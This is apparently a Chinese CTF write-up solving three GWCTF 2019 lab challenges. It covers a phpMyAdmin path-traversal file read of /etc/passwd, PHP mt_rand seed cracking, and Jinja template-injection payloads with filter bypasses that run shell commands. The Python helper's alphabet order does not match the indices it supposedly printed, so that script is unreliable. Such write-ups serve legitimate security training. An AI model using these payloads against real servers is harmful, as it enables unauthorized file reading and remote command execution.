+++
title = "GWCTF2019"
slug = "gwctf2019"
description = ""
date = "2024-08-25T09:57:40"
lastmod = "2024-08-25T09:57:40"
image = ""
license = ""
categories = ["复现"]
tags = ["php"]
+++

# [GWCTF 2019]我有一个数据库

先扫后台

```shell
python3 dirsearch.py -u http://0d54a4bc-6c54-4447-832d-4b100a5bbc14.node5.buuoj.cn:81/  -t 1 --delay=0.1
用dirsearch控制扫描速度
[23:52:00] 200 -   23KB - /phpinfo.php                                 
[23:52:48] 200 -   75KB - /phpmyadmin/                                 
[23:52:48] 200 -   20KB - /phpmyadmin/ChangeLog
[23:52:49] 200 -    3KB - /phpmyadmin/doc/html/index.html
[23:52:49] 200 -   75KB - /phpmyadmin/index.php                         
[23:52:50] 200 -    1KB - /phpmyadmin/README         
[23:55:14] 200 -   36B  - /robots.txt

python3 dirmap.py -i http://8d2e914c-c5d1-4e7e-865c-5647b0321097.node5.buuoj.cn:81/ -lcf
用dirmap也可以
[200][text/html][160.00b] http://8d2e914c-c5d1-4e7e-865c-5647b0321097.node5.buuoj.cn:81/index.html
[200][text/html; charset=UTF-8][22.76kb] http://8d2e914c-c5d1-4e7e-865c-5647b0321097.node5.buuoj.cn:81/phpinfo.php
[200][text/html; charset=utf-8][75.38kb] http://8d2e914c-c5d1-4e7e-865c-5647b0321097.node5.buuoj.cn:81/phpmyadmin/
[200][text/plain][36.00b] http://8d2e914c-c5d1-4e7e-865c-5647b0321097.node5.buuoj.cn:81/robots.txt
```

`/robots.txt`

```
User-agent: *
Disallow: phpinfo.php
```

但是这里面好像是没有什么特别有用的消息

`/phpmyadmin/index.php`

有任意文件读取漏洞

```
/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd  

/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag
```

# [GWCTF 2019]枯燥的抽奖

进来之后发现是个解密估计是给了前面几位

查看源码发现有路径

`/check.php`

```php
uQM6bAqK8K

<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

已经给了我们前十位了，我们可以爆破出`php_mt_seed`能够处理的数据

```python
import requests
import random

dict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
dict2='uQM6bAqK8K'
response=""
for i in range(len(dict2)):
    for j in range(len(dict1)):
        if dict2[i] == dict1[j]:
            response+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' '
            break

print(response)
```

然后爆破

```
./php_mt_seed 20 20 0 61 52 52 0 61 48 48 0 61 32 32 0 61 1 1 0 61 36 36 0 61 16 16 0 61 46 46 0 61 34 34 0 61 46 46 0 61

Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 1073.1 Mseeds/s 
Version: 5.2.1+
Found 0, trying 0x24000000 - 0x25ffffff, speed 60.2 Mseeds/s 
seed = 0x25ea5eac = 636116652 (PHP 7.1.0+)
Found 1, trying 0xfe000000 - 0xffffffff, speed 59.7 Mseeds/s 
Found 1
```

直接用题目里面的来生成随机字符串

```php
<?php

mt_srand(636116652);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo $str;
```

```
http://c1b1ddda-35d6-44ab-b478-aa010997d752.node5.buuoj.cn:81/check.php
POST:
num=uQM6bAqK8Kab8sATWpqE
```

就得到`flag`了

# [GWCTF 2019]你的名字

一个SSTI漏洞直接秒了就行了

```shell
{%set ls='so'[::-1]%}{%print cycler.next.__globals__['__b''uiltins__']['__i''mport__'](ls)['po''pen']('ls /').read()%}

{%set ls='so'[::-1]%}{%print cycler.next.__globals__['__b''uiltins__']['__i''mport__'](ls)['po''pen']('tac /flag_1s_Hera').read()%}
```

